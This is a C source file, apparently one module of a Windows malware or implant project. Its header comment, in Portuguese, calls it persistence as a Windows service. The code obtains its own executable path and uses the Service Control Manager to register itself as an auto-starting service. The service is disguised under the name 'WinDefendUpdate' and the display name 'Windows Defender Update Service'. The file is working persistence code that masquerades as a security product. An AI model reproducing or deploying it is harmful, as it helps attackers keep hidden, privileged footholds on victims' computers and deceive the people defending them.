// service.c – Persistência como serviço Windows
#include <windows.h>
#include <stdio.h>
#include "../../utils/logger.h"

void Persist_Service() {
    // Requires ADMIN privileges.
    // Connect to SCM
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (NULL == schSCManager) {
        Log("Persistence: Failed to open SCM (Need Admin?)");
        return;
    }

    char szPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) return;

    // Create Service
    SC_HANDLE schService = CreateServiceA(
        schSCManager,
        "WinDefendUpdate",       // Service Name
        "Windows Defender Update Service", // Display Name
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        szPath,
        NULL, NULL, NULL, NULL, NULL
    );

    if (schService == NULL) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
             Log("Persistence: Service already exists");
        } else {
             Log("Persistence: Failed to create service");
        }
    } else {
         Log("Persistence: Service created successfully");
        CloseServiceHandle(schService);
    }

    CloseServiceHandle(schSCManager);
}
